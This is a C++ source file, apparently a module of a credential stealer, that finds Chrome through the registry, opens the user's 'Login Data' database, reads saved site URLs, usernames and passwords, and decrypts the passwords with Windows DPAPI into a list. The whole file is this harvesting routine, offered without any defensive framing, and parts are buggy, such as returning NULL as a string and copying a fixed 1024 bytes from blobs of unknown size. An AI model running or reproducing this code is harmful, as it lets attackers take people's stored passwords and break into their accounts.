
#include <iostream>
#include "Chrome.h"

static std::string Decrypt(unsigned char* blob)
{
	DATA_BLOB in;
	DATA_BLOB out;

	BYTE trick[1024];
	memcpy(trick, blob, 1024);
	int size = sizeof(trick) / sizeof(trick[0]);

	in.pbData = blob;
	in.cbData = size + 1;
	char str[1024] = "";

	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
		for (int i = 0; i < out.cbData; i++)
			str[i] = out.pbData[i];
		str[out.cbData] = '\0';

		return str;
	}
	else
		return NULL; 
}
static char * readRegistryValue() {
	LPCSTR value = "Path";
	HKEY hkey = NULL;
	char * sk = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe";

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, sk, 0, KEY_READ, &hkey) != ERROR_SUCCESS)
	{
		return NULL;
	}
	char path[MAX_PATH] = { 0 };
	DWORD dw = 260;
	RegQueryValueEx(hkey, value, 0, 0, (BYTE *)path, &dw);
	RegCloseKey(hkey);
	char *ret = new char[strlen(path) + 1];
	strcpy(ret, path);
	return ret;
}

static bool getPath(char *ret, int id) {
	memset(ret, 0, sizeof(ret));
	if (SUCCEEDED(SHGetFolderPath(NULL, id | CSIDL_FLAG_CREATE, NULL, SHGFP_TYPE_CURRENT, ret)))
		return true;
	return false;
}

std::vector<LoginInfo>& Chrome::getChromePWD()
{
	logins.clear();
	char *installPath = readRegistryValue();
	if (installPath != NULL) {
		sqlite3_stmt *stmt;
		sqlite3 *db;

		char databasePath[260];
		getPath(databasePath, 0x1C);
		strcat(databasePath, "\\Google\\Chrome\\User Data\\Default\\Login Data");

		char *query = "SELECT origin_url, username_value, password_value FROM logins";
		if (sqlite3_open(databasePath, &db) == SQLITE_OK) {
			if (sqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK) {
				while (sqlite3_step(stmt) == SQLITE_ROW) {
					char *url = (char *)sqlite3_column_text(stmt, 0);
					char *username = (char *)sqlite3_column_text(stmt, 1);
					BYTE *password = (BYTE *)sqlite3_column_text(stmt, 2); 
					
					std::string pwd = Decrypt(password);

					LoginInfo *logininfo = new LoginInfo();
					logininfo->Url = url;
					logininfo->UserName = username;
					logininfo->Password = pwd;
					logins.push_back(*logininfo);
					delete logininfo;
				}
			}
			else {
				LPCTSTR szError = (LPCTSTR)sqlite3_errmsg(db);
				if (stmt)
					sqlite3_finalize(stmt);
				printf("%s", szError);
			
				printf("Error preparing database!\n");
			}
			sqlite3_finalize(stmt);
			sqlite3_close(db);
		}
		else {
			printf("Error opening database!\n");
		}
	}
	else {
		printf("Google Chrome is not installed!\n");
	}
	delete[]installPath;
	return logins;
}